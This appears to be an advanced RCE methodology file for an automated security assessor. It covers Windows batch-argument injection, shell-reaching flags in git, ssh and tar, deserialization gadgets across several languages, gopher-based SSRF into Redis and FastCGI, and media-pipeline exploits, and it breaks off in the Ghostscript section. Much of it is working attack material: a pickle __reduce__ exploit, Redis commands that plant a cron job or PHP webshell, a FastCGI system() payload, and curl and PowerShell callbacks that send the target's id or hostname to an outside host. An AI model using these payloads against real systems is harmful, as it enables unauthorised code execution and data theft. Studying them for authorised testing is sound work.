---
name: rce-advanced-deep
description: Advanced RCE depth — Windows CreateProcess/cmd.exe parser-differential (BatBadBut) in depth, git-family argument-injection sub-sink matrix, confirmation-primitive ladder applied to blind and second-order sinks, deserialization JEP 290/classpath/module-boundary depth, WAF/filter bypass classes, gopher-scheme SSRF-to-RCE, media pipeline exploit classes, and composite chained-primitive exploitation.
sibling: rce
load_when: scan_mode == "deep"
---

# RCE — Advanced Depth

This is the advanced+expert deep sibling to `rce.md`. The base owns the shell-vs-array measured exec-sink table, the primary CVE anchors, the confirmation-ladder rung descriptors, and the compact Sleeping Giants reframe; the novel+frontier sibling `rce_novel_deep.md` owns the 2024–2026 published-instance frontier. This file owns the operational depth in between — parser-and-OS differentials in depth, sub-sink matrices, ladder methodology applied to specific sink classes, JEP 290/classpath/module-boundary depth, WAF bypass, and composite chain playbooks — routing by filename.

Load this file when the base file's oracle discipline is not enough: the sink is confirmed but the WAF is between you and it; the array-form spawn boundary looks safe but the target is Windows with a batch resolution surface; the deserialization signal is a DNS hit and you need to distinguish detection from execution; the argument-injection primitive is found and you need the per-tool sub-sink matrix; a blind sink needs statistical timing methodology; or a first primitive needs a chain into durable impact.

## Windows CreateProcess / cmd.exe Parser-Differential — In Depth

The base file's claim: on Windows, when the resolved target of an array-form spawn is a `.bat` or `.cmd` file, Win32 `CreateProcess` implicitly launches `cmd.exe`, which re-parses the reconstructed command line under cmd's rules — breaking the array-boundary safety invariant. This section is the operational depth: the two-step 2024 story, the cross-language CVE cluster, the remediation stratification and what it means for the assessor, and the class fingerprint the grep in a codebase should chase.

### The two-step Node.js story

- **April 2024 — CVE-2024-27980** (HIGH 8.1, fix versions 18.20.2 / 20.12.2 / 21.7.3). Node.js `child_process.spawn`/`spawnSync` with `shell:false`, target `.bat` or `.cmd`, injected `& id` in an argv element executes because CreateProcess reconstructs the command line and passes it to cmd.exe which parses `&` as a command separator. The fix commit — `src: disallow direct .bat and .cmd file spawning` — refuses direct spawn of these extensions and requires the caller to reach through `shell:true` (which then goes through cmd.exe deliberately, with the caller responsible for escaping).
- **July 2024 — CVE-2024-36138** (HIGH 8.1, fix versions 18.20.4 / 20.15.1 / 22.4.1). The advisory heads its section verbatim: "Bypass incomplete fix of CVE-2024-27980." The `-27980` fix enumerated `.bat`/`.cmd` extensions with an exact-match check, but Windows's own extension resolution is more forgiving — mixed case (`.BaT`), trailing dots (`.bat.`), 8.3-shortname aliasing, and other extension shapes reached the same cmd.exe re-parse path without matching the exact-extension check. The successor CVE is the durability signal: this is a stratum, not a single bug.

The assessor consequence: when a Node deployment on Windows executes anything the developer thinks is "just a subprocess," verify the fix baseline. Node 18.x installations on `< 18.20.4`, Node 20.x on `< 20.15.1`, Node 21.x (all — the `-36138` fix ships in 22.4.1, so 21.x is EOL-vulnerable), Node 22.x on `< 22.4.1` are all in scope. `node --version` reports the running version; `require('process').config` reveals build flags.

### The April 2024 coordinated-disclosure CVE cluster

The BatBadBut disclosure was multi-vendor. Each affected runtime published its own CVE:

| CVE | Runtime | Fix baseline | Primitive class |
|---|---|---|---|
| CVE-2024-27980 | Node.js | 18.20.2 / 20.12.2 / 21.7.3 | `child_process.spawn`/`spawnSync` with `shell:false`, `.bat`/`.cmd` target |
| CVE-2024-36138 | Node.js | 18.20.4 / 20.15.1 / 22.4.1 | Bypass of `-27980` via extension-shape variants |
| CVE-2024-24576 | Rust std (`Command`) | 1.77.2 | CVSS 10.0. `std::process::Command` on Windows failed to escape args when spawning a batch target — the Rust standard library's cmd.exe-escaping rules did not match cmd's actual quoting behavior. |
| CVE-2024-1874 | PHP `proc_open` | 8.1.28 / 8.2.18 / 8.3.5 | CVSS 9.4. `proc_open()` with array syntax insufficient escaping — attacker-controlled arg reaches command line without cmd-shape escaping. Not strictly Windows-only per NVD; the fix rewrote array-syntax escaping to cover the same class. |
| CVE-2024-22423 | yt-dlp | 2024.04.09 | CVSS 8.3 / 9.8 (dual scoring in NVD). `--exec` with `%q` format specifier: the previous CVE-2023-40581 fix replaced double quotes with single-quote-escape, but the CreateProcess/cmd path re-parsed the result. Fix rewrites the `%q` handling to be cmd-shape aware. |
| CVE-2024-3566 | multi-vendor CreateProcess | Node.js `< 18.20.2`, `19.0.0..20.12.2`; Haskell `process < 1.6.19.0` | CVSS 9.8. The umbrella CVE assigned to the OS-layer class expressed across Node.js (Windows) and Haskell's `process` package. Windows-only per CPE. |

Persist the raw NVD JSON for each before authorship — this cluster is the mechanical reason the class exists across languages, and its durability across runtimes is the load-bearing framing.

### Cross-runtime remediation stratification

At April 2024 disclosure, remediation stratified into three tiers:

- **Shipped patches:** Node.js, Rust, PHP, Haskell. The runtime standard library was rewritten to either (a) refuse direct batch-file spawn and force the caller through an explicitly-shell path, or (b) apply cmd.exe-specific escaping when the resolved target is `.bat`/`.cmd`.
- **Shipped documentation-only updates:** Go, Python, Ruby, Erlang. The stdlib documentation was updated to say "on Windows, when spawning batch files with attacker-influenced args, you must apply cmd.exe-specific escaping yourself." Python's `subprocess` docs post-disclosure explicitly advise passing `shell=True` with proper escaping for Windows batch targets, confirming the stdlib does not provide safe-by-default execution. Go later received CVE-2024-3566 attribution but retained the documentation-first stance.
- **Won't fix:** Java. `Runtime.exec` array form on Windows spawning a `.bat` target is structurally vulnerable to injected argv-element metacharacters, and the JDK maintainers labeled the class as "the caller's responsibility." Java 21 and 22 are structurally vulnerable in this exact call pattern.

The assessor consequence: a Java Spring Boot service running on Windows Server that calls `Runtime.getRuntime().exec(new String[]{"C:\\service\\process.bat", userInput})` in 2026 is a live RCE class, and the mitigation is caller-side escaping (either wrap in cmd-shape escaping code, or refuse batch-target dispatch and require the caller to use an explicit `.exe`). A Go microservice on Windows Server calling `exec.Command("build.cmd", userArg)` is in the same class. The "docs-only" tier means the class survives even when the runtime is up-to-date.

### The reusable class fingerprint

Grep the codebase for the shape:

```
# Node.js
spawn(<path>|<var>, [...args])          # target may resolve to .bat/.cmd
spawnSync(<path>|<var>, [...args])      # same

# Rust
Command::new(<path>|<var>).args([...])  # target may resolve to .bat/.cmd

# Go
exec.Command(<path>|<var>, ...args)     # target may resolve to .bat/.cmd

# Java
Runtime.exec(new String[]{path, args})
ProcessBuilder(new String[]{path, args})
```

For each match, resolve the *target* — is it a hardcoded `.exe`, or does it come from `PATH` search / config / user input? If the target *can* be a `.bat`/`.cmd`, the args are attacker-influenced, and the runtime is on Windows, the class is live regardless of what the standard library claims. Confirmation: on a test Windows target, spawn the shape with `& powershell -c "Invoke-WebRequest -Uri http://<OAST>?$(hostname)"` as an arg — a Level 1 HTTP callback (per the base file's confirmation ladder) with the target's hostname confirms exec.

## Git-Family Argument-Injection Sub-Sink Matrix

The base file's claim: any tool whose flag list includes an option that runs a subprocess reached via an attacker-controlled argv position is the argument-injection class. This section is the per-tool sub-sink matrix — which flag on which tool reaches a shell, what quoting the tool applies before dispatch, and whether the tool honors an end-of-options separator.

### Documented shell-invoking flags

| Tool | Flag | Sub-sink | Notes |
|---|---|---|---|
| `git` | `--exec=<cmd>` (on `rebase`, `send-email`, `push` via `receive.updateServerInfo`) | `sh -c "<cmd>"` per replayed commit / per email / per push | CVE-2026-52806 (Gogs) canonical. Direct exec-via-documented-flag; not option confusion. |
| `git` | `-c core.sshCommand=<cmd>` | `<cmd>` replaces ssh for git transport | Attacker-controlled clone URL → SSH transport → git spawns `<cmd>` instead of ssh. |
| `git` | `-c core.editor=<cmd>` / `-c core.pager=<cmd>` | `<cmd>` invoked for interactive editing / paging | Reachable in interactive contexts; less common in server-side invocations. |
| `curl` | `--config <file>` / `-K <file>` | `curl` reads the file as a config with directives including `exec`-shape URL sinks | If the attacker controls the file *path*, `--config /dev/stdin` or `--config <attacker-writable>` re-parses new curl options. |
| `curl` | `--output-dir <dir>` + relative path in URL | Writes into arbitrary directory | File-write primitive, not exec-direct — chain to `.bashrc`/`.ssh/authorized_keys` or a serveable path. |
| `ssh` | `-o ProxyCommand=<cmd>` / `-o ProxyUseFdpass=yes` | `<cmd>` invoked as the transport | Attacker-controlled destination or ssh args reach `ProxyCommand` which is a shell string. |
| `ssh` | `-o LocalCommand=<cmd>` (with `PermitLocalCommand yes`) | `<cmd>` invoked on connection | Requires client-side config. |
| `rsync` | `-e <cmd>` | `<cmd>` replaces the remote-shell transport | Historically abused via `rsync -e 'sh -c "id"' user@host:` — the transport is a shell string. |
| `tar` | `--use-compress-program=<cmd>` / `-I <cmd>` | Runs `<cmd>` as the compress filter | If the archive filename is attacker-controlled and reaches a `tar` argv position, `-I sh -c "id"` executes. GNU tar honors this in most invocation contexts. |
| `ffmpeg` | `protocol_whitelist` slack + `concat:` | Reads local files listed in a concat manifest via arbitrary protocols (`file:`, `http:`, `data:`) | File-read primitive that escalates when a subsequent tool executes the read content (e.g., `ffmpeg → shell script → exec`). |
| ImageMagick | `-write` with `MSL:`/`ephemeral:` prefixes / policy-relaxed delegates | Delegate policy invokes `sh -c "<template>"` with attacker template fragments | ImageTragick (CVE-2016-3714) class; still exploitable when `policy.xml` allows the risky coder. |
| `gpg` | `--exec-path=<dir>` | Overrides which helpers gpg invokes | File-write + control-primitive; less direct than `git --exec`. |
| `pip` | `--index-url=<url>` / `--extra-index-url=<url>` / `--find-links=<url>` | Fetches and installs packages from attacker origin | Delivery vector to a malicious wheel that runs code on install; not "flag reaches shell" but "flag reaches build script." |

The class fingerprint per tool: `<tool> --help` and grep for `PROGRAM`, `COMMAND`, `execute`, `exec`, `shell`, `hook`, `filter`. Any flag whose documentation reads "runs the given command" or "invokes the given program" is a sub-sink candidate. The class is not one CVE — it is the reachable subset of a tool's argument surface.

### End-of-options delimiter support surface

Some tools honor `--` as end-of-options, so `<tool> -- <attacker-string>` refuses to interpret the string as a flag. Others do not. The mitigation "put `--` before user-controlled positional args" is transferable only where the tool supports it.

- **`git`**: supports `--end-of-options` explicitly. Some git subcommands (e.g., `git log`, `git checkout`) also honor `--` before pathspec but not all subcommands treat the same way for refnames. Gogs's fix combined `--end-of-options` with input-level rejection of branch names beginning with `-` (a defense-in-depth pattern).
- **`curl`**: supports `--` since 7.75.0. Older curl builds do not.
- **`ssh`**: does not have a documented `--` end-of-options; the safest pattern is to refuse hostnames starting with `-`.
- **`rsync`**: does not have a documented `--` end-of-options; refuse source/destination strings starting with `-`.
- **`tar`**: honors `--` inside archive-file lists but not for the archive filename itself — the archive filename must be filtered.
- **`ffmpeg`**: has `-i` for input and a specific-syntax parser; the transferable mitigation is input-format allowlisting and `protocol_whitelist file`.
- **`ImageMagick`**: has no `--` shape; the transferable mitigation is `policy.xml` restrictions.

The claim "`--` end-of-options plus dash-prefix rejection is the transferable mitigation for the whole class" is *false* — it works only where the tool supports it, and the SSH/rsync/tar/ffmpeg/ImageMagick class needs distinct per-tool mitigations. Report per-tool discipline, not a generic pattern.

### Second-order argument injection

The first flag opens a configuration surface that reads a file whose contents include additional flags. If the attacker controls the file's *content*, the second-order path lands more flags — often reaching a shell sub-sink the first-level surface didn't expose.

- **`git -c include.path=<path>`** reads an INI config file whose directives include `[core] sshCommand=<cmd>` — a second-order path to the `core.sshCommand` sub-sink.
- **`curl --config <file>`** reads a file whose directives include `--output-dir` and `-o` — arbitrary file-write via a controlled file.
- **`ssh -F <config>`** reads an SSH config whose `Host` blocks include `ProxyCommand` and `LocalCommand`.
- **`tar --files-from=<file>`** reads a file listing archive members — if the tar invocation is `tar -c --files-from=<attacker>`, the list can include `../../etc/passwd` and reach path-traversal-adjacent primitives.

Discovery method: for every first-order argument-injection primitive, enumerate the target tool's `--config`/`--include`/`--file`-shape flags and check whether an attacker-controllable file path reaches them. Two flags to reach a shell is still one primitive.

## Confirmation-Primitive Ladder — In Depth

The base file's ladder (Levels 0 through 5) sets the rung meanings. This section applies each rung to specific sink classes and the class's methodology.

### Blind deserialization confirmation

- **Level 0 (DNS)**: URLDNS/`URL.hashCode` reaches the DNS resolver; a hit proves untrusted deserialization occurred. Do *not* upgrade to "RCE confirmed" — the sink class isn't proven to be exec-reachable. Continue to Level 2 or Level 5 with a distinct payload.
- **Level 1 (HTTP)**: A gadget that reaches `URLConnection.getResponseCode()` (`URLDNS`'s HTTP-shape sibling) proves the deserializer decodes URL and initiates connection — one more sink deeper, but still not exec. Distinguish "URL fetched" from "command ran that fetched URL" by the fetch's Host header (`Host: <target-domain>` vs `Host: <OAST-domain>`); a target-domain Host means the deserializer's URL fetch ran, not the target's shell.
- **Level 2 (OOB file drop with echo)**: A gadget that reaches `Runtime.exec` (`CommonsCollections1` and family, when the classpath conditions match) is a Level 5 candidate — but if the response strips output, use `curl -X POST xyz.oast.fun/x -d "$(id)"` variant with `sh -c` invocation. The callback body echoes the target's `id` output; the exec is proven.
- **Level 4 (time delay)**: A `Thread.sleep(5000)` gadget confirms code executed if you can measure end-to-end. Statistical: fire the payload 30 times; if the wall-clock 95th percentile is above baseline + 4500 ms, exec ran. WAFs sometimes queue/coalesce requests — a queue-shaped latency bump does not confirm exec; the *variance shape* does. A payload with `Thread.sleep(rand(1000,5000))` returned to the client, correlated by response ID, produces a per-request-controlled delay that a request-queuing WAF cannot reproduce.

### Second-order sink confirmation

A second-order sink means the payload lands but is not deserialized until a later reprocessing step (a background job, a cache warmup, a scheduled task). Confirmation is temporally decoupled from injection:

- Fire the payload with a unique OAST subdomain per-request (`<request-id>.<oast>.fun`) so the callback identifies which injection fired.
- Instrument the target's job queue if you have any observability — a callback that arrives 45 seconds after the injection likely fires from a scheduled job, not the request handler.
- Use time-of-arrival correlation to build a map of second-order sinks — the same injection reaching the DB but a callback 15 min later means a periodic reprocessor is the sink.

### In-band echo when the response context strips output

If the response returns HTML with the injection's output HTML-escaped, use a distinctive marker: `; echo "===MARKER===$(id | base64)===END===";` — a marker unlikely to appear in stripped HTML; grep the response for the marker with a decode step. If the response is JSON with specific string types, `; id | jq -R -s .` produces a JSON-safe string. Match the payload's output shape to the response's data type.

### Statistical timing methodology (Level 4 in depth)

The naive `; sleep 5` measure is a single sample; WAFs that coalesce or defer requests can produce false positives. The disciplined form:

- **Baseline**: fire the endpoint 30 times with a null payload, record 95th percentile.
- **Injection**: fire the endpoint 30 times with `; sleep 5`, record 95th percentile.
- **Confirmation threshold**: injection p95 > baseline p95 + 4500 ms with p < 0.01 (t-test or Mann-Whitney). Single-sample latency spikes below this do not confirm exec.
- **Cross-fire negative control**: fire the endpoint 30 times with a payload that syntactically resembles the injection but does *not* reach the sink (e.g., `; #sleep 5`). The negative-control latency should match baseline. If it also spikes, the timing signal is from something other than exec.

Load `rce_novel_deep` for the LLM-integrated-pipeline timing methodology and the modern-cache-coherence side-channel work.

## Deserialization Advanced

The base file's frame: URLDNS is detection, not execution; gadget-chain reachability is a supply-chain property. This section is the operational depth on how a chain gets constructed, how JEP 290 filters get worked-through, and how JPMS module boundaries constrain the surface.

### Gadget-chain construction constrained by classpath composition

Deserialization gadget chains are constrained only by what classes are on the classpath — including transitively-included libraries the application never calls. Haken's automated-discovery paper (Black Hat US-18) states the constraint near-verbatim: "the application does not need to invoke any specific method for the chain to work; only the deserialization sink and the classpath composition matter." Sleeping Giants (CCS 2025) demonstrates the stronger dynamic form: transitive-classpath presence, not invocation, is operative, and small changes to a dependency's history can activate dormant chains.

The assessor consequence: "the app doesn't call Apache Commons Collections" is not a defense against `CommonsCollections1`-family payloads if `commons-collections-3.2.x` is on the classpath. Grep the built JAR/WAR for the transitively-included libraries and match against the ysoserial-family gadget-source list. In a Spring Boot fat-JAR, `jar tf app.jar | grep -E '(commons-|spring-|xstream|jackson)'` enumerates the surface.

### JEP 290 ObjectInputFilter — working-through, not around

JEP 290 (Java 9+) introduced `ObjectInputFilter`, a serialization allowlist mechanism. The filter runs at every `readObject` and decides per-class whether to admit deserialization. A filter of `!*` rejects everything; a filter of `com.myapp.*;!*` admits only application classes.

The attacker's working-through pattern: identify which classes the filter admits, then chain gadgets *entirely within the admitted set*. If the filter admits `java.util.HashMap` (a common permit even in restrictive configs), URLDNS-shape probes still work. If the filter admits a serializable proxy class from the application's own package, a chain that terminates in that proxy's `readObject` may reach a callback into `ClassLoader.defineClass` or `MethodHandle.invoke` — depending on what the app's own serializable classes expose.

The disciplined test: instrument the target's `ObjectInputFilter` at runtime (if you have local runtime access) or read the deployed config (`jdk.serialFilter`, `sun.rmi.registry.registryFilter`) and enumerate the admitted class set against known gadget-source packages. The finding is not "deserialization" — it is "the admitted class set contains gadget sources for which chain X reaches sink Y."

### JPMS module boundaries

Java Platform Module System (JPMS, Java 9+) constrains reflective access. A gadget chain that uses reflection to reach `Runtime.getRuntime().exec` may fail under strict JPMS if the `java.lang` package is not `--add-opens`-exposed. Modern JVMs (17+) print warnings for illegal reflective access; a target running with `--illegal-access=deny` refuses the reflection outright.

The assessor's discovery: check the deployed JVM's startup flags (`ps aux | grep java` or `/proc/<pid>/cmdline`) for `--add-opens`, `--add-exports`, and `--illegal-access`. A target that runs `--add-opens java.base/java.lang=ALL-UNNAMED` is deliberately opening the reflection surface — this is the common Spring Boot 3.x deployment pattern for legacy compatibility, and it re-opens gadget-chain reachability the JPMS default would close.

### `SerialVersionUID` and version constraints

`readObject` checks the deserialized `SerialVersionUID` against the deserializing class's declared `serialVersionUID`. A mismatch throws `InvalidClassException` and refuses the deserialization. Attackers evade this by:

- Fingerprinting the target's deployed library versions (Server headers, `META-INF/MANIFEST.MF` if reachable, error stack traces) and building the ysoserial payload against the exact matching version.
- Using `SerialVersionUID`-compatible variants — many gadget classes explicitly set `serialVersionUID = 1L` for backward compatibility, giving a stable target.
- Using classpath-unique classes — if the app bundles a specific version of a library, the payload matches that version's `serialVersionUID`.

The assessor pattern: enumerate the target's classpath library versions before generating the payload — a version mismatch produces `InvalidClassException`, not exec, and looks like a false negative.

## Second-Order and Blind Deserialization

The response reflects nothing; the injection lands in a store or a queue; the deserialization fires later, in a different process context. The confirmation methodology is temporally decoupled from the injection.

### Deferred triggers

- **Cache warmup on next request**: some caches deserialize entries on the first read after a write. Fire the payload, wait, then fire a benign read that triggers deserialization — the callback arrives from the read-time process.
- **Scheduled job / cron**: some jobs deserialize queue entries periodically. Fire the payload, wait for the periodic interval, then check for callbacks. Unique OAST subdomain per injection identifies which fired.
- **Session hydration**: some frameworks lazily hydrate session-attached objects. Fire the payload attached to a session attribute, then trigger a request that touches the attribute; deserialization fires on read.

### Blind confirmation via OAST or time

Once a deferred-trigger scenario is suspected, the confirmation ladder still applies:

- **Level 0 (URLDNS on session store)**: fire a URLDNS-shape payload into the session store; when a callback arrives, the store deserialized. If the callback comes minutes later, it fires from a lazy-load or a background reprocessor.
- **Level 2 (OOB file drop)**: a `Runtime.exec` gadget in the session store fires on read; the exec runs `curl` to OAST with `$(id)`; the callback body carries the target's `id`.
- **Level 4 (time delay)**: for a request-triggered deferred sink, measuring end-to-end latency doesn't work — the sink fires in a different process. Use a distinct OAST callback per-request and correlate arrival time.

## Advanced Classpath Enumeration for Deserialization

Chain construction depends on knowing what's on the classpath. Guessing wastes payloads and produces `InvalidClassException`-shaped false negatives. The disciplined enumeration path:

### JAR/WAR content inspection

- **From a compiled artifact you have** (or a file-read primitive that reaches the deployment): `jar tf app.war | grep -E '\.jar$'` enumerates bundled libraries. For each `.jar`, `unzip -p app.war <lib>.jar META-INF/MANIFEST.MF` extracts the manifest with `Implementation-Title` and `Implementation-Version`.
- **From Spring Boot fat-JARs**: `BOOT-INF/lib/*.jar` is the actual dependency set. `jar tf` on the fat-JAR is the fastest enumeration.
- **From error stack traces**: an unhandled exception often leaks class names of libraries transitively invoked. Fire a payload that deliberately fails (`INVALID` where a class-name goes) and read the stack trace's `at com.myapp.<...>` and `at org.apache.<...>` lines.

### Server-header fingerprinting

- `Server: Apache-Coyote/1.1` → Tomcat, and the Tomcat version implies a range of bundled Jackson/Jetty versions.
- `X-Powered-By: JBoss` → JBoss/WildFly, with well-known bundled libraries per version.
- `Set-Cookie: JSESSIONID=...; Path=/; HttpOnly` → Java servlet container.

### Class-existence probes via error differentials

Fire a payload that reads a specific class name; if the class exists on classpath, deserialization fails with `InvalidClassException`; if not, it fails with `ClassNotFoundException`. The error class distinguishes classpath presence from absence — a mass probe against a ysoserial gadget-source list enumerates which gadget families are candidate.

### Match against known gadget-source families

The ysoserial README enumerates gadget sources by chain name (CommonsCollections, CommonsBeanutils, Spring, JBoss, Groovy, JRMPClient, JSON, etc.). Cross the enumerated classpath against this list; each match is a candidate chain family. Do not report a specific chain count as "the majority" — the ysoserial payload set is not uniformly distributed across gadget families, and mis-counting chain families is a documented false-lead pattern.

## Per-Language Deserialization-to-Exec Transitions

The preceding sections cover Java classpath composition, JEP 290, JPMS, and SerialVersionUID — the Java-specific constraints. Each major runtime has its own deserialization-to-exec shape with different primitives, gadget catalogs, and confirmation methods. The common pattern: the deserializer reconstructs an object graph; the graph's constructor, destructor, or magic method reaches a code-execution sink. What changes per language is *which* magic method fires and *which* sink class it reaches.

### .NET — BinaryFormatter, ViewState, and Json.NET

**BinaryFormatter.** The canonical .NET deserialization sink. `BinaryFormatter.Deserialize(stream)` reconstructs an arbitrary object graph, and the `ISerializable` interface allows custom deserialization logic. Two gadget families dominate:

- **TypeConfuseDelegate chain:** reaches `Process.Start(cmd)` via a delegate confusion in `SortedSet<string>` — the comparator delegate is swapped to point at `Process.Start` at deserialization time. The ysoserial.net `TypeConfuseDelegate` payload is the reference.
- **ObjectDataProvider chain:** `System.Windows.Data.ObjectDataProvider` invokes an arbitrary method on an arbitrary type during its setter chain — WPF's data-binding pipeline is the gadget. The payload calls `Process.Start("cmd.exe", "/c <payload>")`.

`BinaryFormatter` is deprecated in .NET 5+ and removed from the default allowlist in .NET 8+. But legacy ASP.NET Framework 4.x services (IIS-hosted) still expose `BinaryFormatter` sinks in session-state handlers, MSMQ listeners, and Remoting endpoints. Grep for `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `ObjectStateFormatter`, `LosFormatter`.

**ViewState.** ASP.NET Web Forms serializes page-state into a hidden `__VIEWSTATE` field. When `enableViewStateMac` is false or the MAC key (`machineKey` in `web.config`) is known/leaked, the attacker crafts a ViewState blob carrying a deserialization gadget. `ObjectStateFormatter.Deserialize` is the sink. Discovery: inspect the HTML source for `__VIEWSTATE` and `__VIEWSTATEGENERATOR`. Test with a tampered ViewState — if the server returns a MAC-validation error, MAC is enforced. If no error, the sink is open.

**Json.NET TypeNameHandling.** Newtonsoft Json.NET with `TypeNameHandling` set to anything other than `None` embeds type metadata in JSON (`$type` fields). The deserializer instantiates the named type, and gadget types that perform actions in their setters are reachable. Grep for `TypeNameHandling.Auto`, `TypeNameHandling.All`, `TypeNameHandling.Objects`.

### PHP — unserialize and Phar

**unserialize().** PHP's `unserialize()` reconstructs an object graph; `__wakeup()` fires during deserialization, and `__destruct()` fires when the object leaves scope. Gadget chains walk from a magic method to `call_user_func`, `system`, `exec`, `eval`, or `file_put_contents`.

The phpggc tool (analogous to ysoserial) catalogs gadget chains per PHP framework: Laravel (PendingBroadcast, RCE1–RCE17), Symfony (Process, RCE1–RCE5), Monolog (RCE1–RCE5), Guzzle, Doctrine, WordPress, Yii, CakePHP. Enumerate the target's framework and version, then match against phpggc's catalog.

**Phar deserialization.** PHP's `phar://` stream wrapper triggers `unserialize()` on the Phar's metadata block when *any* file operation references a `phar://` path — `file_exists('phar://attacker.phar')`, `is_dir('phar://...')`, `fopen('phar://...')`. The deserialization is implicit: the developer never calls `unserialize()`. Phar deserialization expands the sink surface to any file-operation function that accepts a user-controlled path with a `phar://` prefix. The Phar can be renamed to `.jpg`/`.png` — the extension doesn't matter, only the magic bytes.

### Python — pickle and PyYAML

**pickle.** Python's `pickle.loads(data)` reconstructs an arbitrary object graph. The `__reduce__` method defines how an object should be unpickled — it returns a callable and its arguments. An attacker's pickled object returns `(os.system, ("id",))` from `__reduce__`, and `os.system("id")` executes during unpickling:

```python
import pickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("id",))
pickle.dumps(Exploit())
```

No gadget chain needed — `__reduce__` *is* the direct exec primitive. Any `pickle.loads` on untrusted data is RCE by definition. There is no safe subset of pickle. Grep for `pickle.loads`, `pickle.load`, `cPickle.loads`, `shelve.open` (pickles under the hood).

**PyYAML.** `yaml.unsafe_load(data)` instantiates arbitrary Python objects via YAML tags. `!!python/object/apply:os.system ["id"]` invokes `os.system("id")` during parsing. `yaml.safe_load` blocks this by refusing Python-specific tags. `yaml.load` without an explicit Loader argument defaults to `FullLoader` in PyYAML 6.0+, which restricts but doesn't fully block the surface.

### Ruby — Marshal.load

Ruby's `Marshal.load(data)` reconstructs an arbitrary object graph. Research (Elttam, 2018; deserialization-scanner/universal-rce) established a universal chain via `ERB::Util` that reaches `Kernel#system` — the chain walks through `Gem::Installer`, `Gem::SpecFetcher`, and `Gem::Requirement` depending on the Ruby version.

Grep for `Marshal.load`, `Marshal.restore`, and `YAML.load` (Ruby's YAML parser `Psych` can instantiate objects via `!ruby/object` tags — same class as Python's PyYAML). Rails session cookies using `Marshal` serialization (the default before Rails 7.1) are a common sink — a leaked or weak `secret_key_base` allows session-cookie forgery with a Marshal payload.

## SSRF → gopher → Protocol-Specific RCE

The base file names Redis and FastCGI as SSRF-to-RCE targets and delegates the gopher construction to this file. Every line-oriented protocol reachable from a fetcher that honors the `gopher://` scheme is a candidate. The construction pattern is the same across protocols: encode the protocol's wire format into a `gopher://host:port/_<url-encoded-bytes>` URL, where the underscore is the gopher payload separator.

### Redis (gopher://)

Redis's RESP protocol is line-oriented (`\r\n` separated). Every Redis command becomes a gopher-URL-encoded payload:

```
gopher://internal-redis:6379/_
  *3\r\n$3\r\nSET\r\n$1\r\nx\r\n$<len>\r\n<payload>\r\n
  *4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$<dirlen>\r\n<dir>\r\n
  *4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$<fnlen>\r\n<fn>\r\n
  *1\r\n$4\r\nSAVE\r\n
```

Turned into URL-encoded bytes, the whole payload rides in one `gopher://` URL. Three archetypal exploit targets:

- **Cron entry via CONFIG SET dir + dbfilename**: point `dir=/var/spool/cron/crontabs` and `dbfilename=root`, `SET` a value whose contents are a valid crontab line (`* * * * * curl OAST/$(id)`), `SAVE` writes the value verbatim. Cron picks it up at the next minute mark. Requires Redis running as root (common in containers).
- **Webroot write**: `dir=/var/www/html`, `dbfilename=x.php`, `SET x '<?php system($_GET[0]); ?>'`. Re-request `x.php?0=id` — Level 5 in-band echo.
- **Module load**: `MODULE LOAD /path/to/shared-object.so`. Requires Redis 4.0+ *and* a writable path reachable from the Redis server. Combine with an upload primitive.

Confirmation: for the cron path, the OAST callback arrives at the next minute mark carrying the target's `id` output. For webroot, the follow-up HTTP request echoes the command output. For module load, the module's own load-side-effect fires immediately.

### FastCGI / PHP-FPM (gopher://)

FastCGI records are binary, not line-oriented. Build the FCGI record structure:

- FCGI_BEGIN_REQUEST record (role = FCGI_RESPONDER)
- FCGI_PARAMS records with environment variables — critically, `PHP_ADMIN_VALUE` allows setting per-request `auto_prepend_file`, and any `SCRIPT_FILENAME` pointing to any local file that PHP will parse (`/etc/passwd`, `/proc/self/environ`, or a stub PHP file if one exists) with `auto_prepend_file=data://text/plain,<?php system('id'); ?>` runs arbitrary PHP.
- FCGI_STDIN record (empty for GET-shape requests)

The whole binary blob URL-encodes into the `gopher://` URL. Confirmation: FPM's response body carries the PHP `system('id')` output — Level 5 in-band. The primitive is proven when the response echoes `uid=`.

### Memcached (gopher://)

Memcached's text protocol is line-oriented and unauthenticated by default. Reachable primitives: `set` an arbitrary key with arbitrary bytes (useful when the app later reads the key). Not directly RCE, but chain into a deserialization sink that reads the memcached value.

### The gopher-scheme reachability precondition

Not every SSRF sink honors `gopher://`. `curl` compiled with `--enable-file --enable-gopher` (the common Linux distribution default until 2020) does. Modern `curl` builds may disable gopher; test the sink first with `gopher://oast.fun/_probe` and verify the OAST callback arrives. When the sink is a language-native fetcher (Python's `requests`, Node's `fetch`, Go's `net/http`), gopher is generally *not* supported — the SSRF-to-RCE chain requires a `curl`-shape backend, not a language-native HTTP client. Load `ssrf_advanced_deep` for the scheme-reachability matrix.

## Media and Document Pipeline Exploit Classes in Depth

The base file names ImageMagick, Ghostscript, ExifTool, LaTeX, ffmpeg as media pipeline sinks. Each has a distinct class of exploit surface — depth here on the transitions, delivery vectors, and confirmation.

### ImageMagick — delegate policy, `MSL:`, and coder primitives

- **The class**: ImageMagick dispatches file-format handling to per-format "delegates" defined in `delegate.xml`. A delegate is a `system()`-shape command template; the attacker's job is to write to a format whose delegate contains attacker-controllable substrings.
- **ImageTragick (CVE-2016-3714)**: `MVG` and `MSL` coders read image-description-language files that themselves invoke external programs; `push graphic-context; fill 'url(https://x.tld/a"|id>/tmp/o")'; pop graphic-context;` reaches shell via the delegate's URL-fetching path. `policy.xml` mitigates by disabling `MVG`/`MSL`; test the target's policy with a benign MVG file first (it should error with "delegate policy prohibited").
- **The `ephemeral:` and `msl:` prefixes**: some ImageMagick versions treat `ephemeral:/tmp/x` and `msl:script.msl` as scheme-shape paths that trigger different coders. If policy.xml is loose, these reach `MSL` even when the filename doesn't end in `.msl`.
- **Delegate injection via SVG**: SVG coders may invoke `rsvg-convert` or similar; a crafted SVG with `<image xlink:href="url with pipe">` can reach shell if the URL-loading delegate is misconfigured.
- **Confirmation**: OAST callback from within a converted image. Load `insecure_file_uploads` for the upload-delivery angle.

### Ghostscript — PostScript %pipe% and -dSAFER

- **CVE-2023-36664**: `%pipe%` file operator in PostScript reaches shell in Ghostscript versions before 10.02. A crafted PostScript file (or a PDF that Ghostscript is invoked to render) with `(%pipe%id > /tmp/o) (r) file` opens a shell pipe.
